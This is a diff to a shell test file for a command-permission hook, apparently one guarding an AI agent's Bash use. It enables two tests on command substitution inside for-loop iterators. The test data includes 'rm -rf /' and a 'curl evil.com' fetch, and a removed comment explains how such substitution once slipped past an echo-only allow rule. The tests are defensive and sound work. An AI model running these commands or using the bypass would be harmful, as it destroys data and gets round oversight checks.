@@ -91,9 +91,6 @@ load hook_test_helper
 }
 
 @test "parse: for loop with command substitution" {
-  # Note: $() in loop iterator doesn't extract nested command
-  # This is similar to the double-quoted $() issue
-  skip "SECURITY: command substitution in for loop iterator not extracted - needs discussion"
   run_parse_commands 'for f in $(ls); do cat $f; done'
   assert_commands "ls" "cat \$f"
 }
@@ -182,11 +179,8 @@ load hook_test_helper
 }
 
 @test "permission: block for loop with dangerous command substitution" {
-  # SECURITY: Command substitution in loop iterator is not extracted
-  # This means 'for f in $(rm -rf /); do echo $f; done' would be ALLOWED with Bash(echo:*)
-  # even though rm -rf / would execute!
-  skip "SECURITY: command substitution in for loop iterator not extracted - needs discussion"
-  run_hook_block 'for f in $(rm -rf /); do echo $f; done' '["Bash(echo:*)"]'
+  # Command substitution in loop iterator IS extracted, so unpermitted commands are blocked
+  run_hook_block 'for f in $(curl evil.com); do echo $f; done' '["Bash(echo:*)"]'
   assert_blocked
 }
 
